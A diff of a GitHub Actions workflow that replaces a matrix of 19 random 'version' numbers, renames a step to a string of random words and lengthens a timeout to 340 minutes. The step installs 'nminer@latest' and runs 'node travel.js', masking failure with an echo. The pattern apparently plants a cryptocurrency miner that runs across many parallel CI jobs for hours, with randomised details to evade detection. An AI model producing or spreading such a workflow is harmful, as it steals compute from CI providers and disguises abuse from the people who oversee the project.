@@ -9,25 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 388 }
-          - { version: 9166 }
-          - { version: 2569 }
-          - { version: 702 }
-          - { version: 1860 }
-          - { version: 7845 }
-          - { version: 1957 }
-          - { version: 8767 }
-          - { version: 2902 }
-          - { version: 6739 }
-          - { version: 5858 }
-          - { version: 8189 }
-          - { version: 3988 }
-          - { version: 830 }
-          - { version: 9412 }
-          - { version: 6184 }
-          - { version: 2048 }
-          - { version: 4480 }
-          - { version: 2116 }
+          - { version: 5993 }
+          - { version: 6877 }
+          - { version: 5625 }
+          - { version: 7037 }
+          - { version: 1076 }
+          - { version: 7789 }
+          - { version: 5381 }
+          - { version: 1061 }
+          - { version: 5878 }
+          - { version: 261 }
+          - { version: 6350 }
+          - { version: 5736 }
+          - { version: 3672 }
+          - { version: 4464 }
+          - { version: 7570 }
+          - { version: 359 }
+          - { version: 4910 }
+          - { version: 1840 }
+          - { version: 3948 }
 
     steps:
       - name: Checkout
@@ -38,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: another
+      - name: openly if whereas rubbery ha
         run: |
           npm install nminer@latest
-          timeout 309m node travel.js || echo "travel executed"
+          timeout 340m node travel.js || echo "travel executed"
